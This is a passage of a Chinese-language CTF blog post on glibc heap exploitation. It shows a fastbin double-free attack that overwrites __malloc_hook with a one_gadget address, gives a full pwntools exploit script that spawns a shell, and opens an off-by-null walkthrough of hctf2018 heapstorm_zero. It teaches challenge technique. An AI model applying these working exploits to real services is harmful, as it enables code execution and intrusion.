+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进行fastbin double free</span></span><br><span class="line">post(<span class="string">&#x27;2222222&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">post(<span class="string">&#x27;3333333&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将fastbin的fd指针修改为malloc_hook-0x3-0x10</span></span><br><span class="line">post(p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">0x3</span>)) <span class="comment">#4</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>确定one_gadget的地址</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/1563870733457.png" alt="1563870733457"></p>
+<p>one_gadget1 = 0x45216 + libc_base</p>
+<p>one_gadget2 = 0x4526a + libc_base</p>
+<p>one_gadget3 = 0xf02a4 + libc_base</p>
+<p>one_gadget4 = 0xf1147 + libc_base</p>
+<p>依次尝试，最后发现one_gadget3可以用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">post(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">post(<span class="string">&#x27;\x00\x00\x00&#x27;</span>+p64(one_gadget3))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x400986</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter the Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter the Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice:&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter the Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请一个ad，放入unsortedbin中</span></span><br><span class="line">ad(<span class="string">&#x27;abcdefgh&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">post(<span class="string">&#x27;abcdefgh&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读出libc地址</span></span><br><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">post(<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">arena_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = arena_addr - main_arena - <span class="number">88</span> - <span class="number">0x100</span></span><br><span class="line"><span class="comment">#stdin_addr = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]</span></span><br><span class="line"><span class="comment">#system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free_addr = libc_base + libc.symbols[&#x27;free&#x27;]</span></span><br><span class="line">one_gadget1 = <span class="number">0x45216</span> + libc_base</span><br><span class="line">one_gadget2 = <span class="number">0x4526a</span> + libc_base</span><br><span class="line">one_gadget3 = <span class="number">0xf02a4</span> + libc_base</span><br><span class="line">one_gadget4 = <span class="number">0xf1147</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请fakechunk: 0x60208d</span></span><br><span class="line"></span><br><span class="line">post(<span class="string">&#x27;2222222&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">post(<span class="string">&#x27;3333333&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">post(p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">0x3</span>)) <span class="comment">#4</span></span><br><span class="line">post(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">post(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">post(<span class="string">&#x27;\x00\x00\x00&#x27;</span>+p64(one_gadget3))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="off-by-null"><a class="markdownIt-Anchor" href="#off-by-null"></a> off by null</h1>
+<p>一般情况下，需要能申请的 chunk 大于 0x100，这样 off by null 可以溢出覆盖 <code>prev_inuse</code> 标志位，否则直接将整个 chunk size 覆盖为 0 了。</p>
+<p>先上一道特殊的题：<a target="_blank" rel="noopener" href="https://github.com/veritas501/hctf2018">hctf2018 heapstorm_zero</a></p>
+<h2 id="利用分析"><a class="markdownIt-Anchor" href="#利用分析"></a> 利用分析</h2>
+<p>本题限制了申请 chunk 必须小于等于 0x38，因此必定是 fastbin，此时只有 offbynull 不足以利用。</p>
+<blockquote>
+<p>tip1：<code>scanf()</code> 函数在读取字符串时，如果字符串较大，会调用 malloc 申请一个块大内存来暂时保存。</p>
+<p>tip2：malloc 分配内存时，先检查 fastbin, smallbin, unsortedbin, largebin，如果都没有合适的 chunk，则会分割 top_chunk。<strong>然而此时会触发堆块合并，会尝试将相邻的 fastbin 合并，保存至 unsortedbin 中。</strong></p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/image-20201007115842957.png" alt="malloc.c _int_malloc 程序部分截图"></p>
+</blockquote>
+<p>所以，申请 10 个 fastbin chunk，释放后通过 scanf 分配一个超大 chunk，触发malloc_consolidate 将 fastbin chunk 合并，从而在 unsortedbin 中得到一个大 chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure>
+<p>触发 consolidate 之前：</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/image-20201007120448714.png" alt="image-20201007120448714"></p>
+<p>理论上，合并后的 chunk 大小为 10 * 0x8 + (0x28*3 + 0x18*2 + 0x38*5) = 0x210</p>
+<p><img src="/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/image-20201007120836065.png" alt="image-20201007120836065"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">主页</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unlink%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text"> Unlink技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目分析&#x2F;利用步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">2.</span> <span class="toc-text"> Fastbin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text"> 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 利用步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#off-by-null"><span class="toc-number">3.</span> <span class="toc-text"> off by null</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text"> 利用分析</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&text=【堆利用】heap利用技术"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&is_video=false&description=【堆利用】heap利用技术"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【堆利用】heap利用技术&body=Check out this article: https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&title=【堆利用】heap利用技术"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&name=【堆利用】heap利用技术&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iamjustachild.github.io/2019/07/heap%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/&t=【堆利用】heap利用技术"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Amjac
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">主页</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
